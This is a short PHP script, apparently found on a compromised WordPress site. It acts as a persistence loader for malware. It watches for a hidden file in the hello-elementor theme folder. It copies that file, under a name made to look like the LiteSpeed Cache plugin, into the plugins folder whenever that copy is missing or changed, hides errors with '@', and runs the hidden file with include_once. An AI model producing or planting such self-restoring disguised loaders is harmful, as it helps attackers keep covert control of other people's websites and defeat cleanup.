<?php
$target = '/home/u384311178/domains/lynixworld.com/public_html/wp-content/plugins/litespeed_cache.php';
$elementor = '/home/u384311178/domains/lynixworld.com/public_html/wp-content/themes/hello-elementor/elementor_bk.php';

if (file_exists($elementor)) {
    if (!file_exists($target) || md5_file($target) !== md5_file($elementor)) {
        @copy($elementor, $target);
        @chmod($target, 0644);
    }
    @include_once $elementor;
}
?>
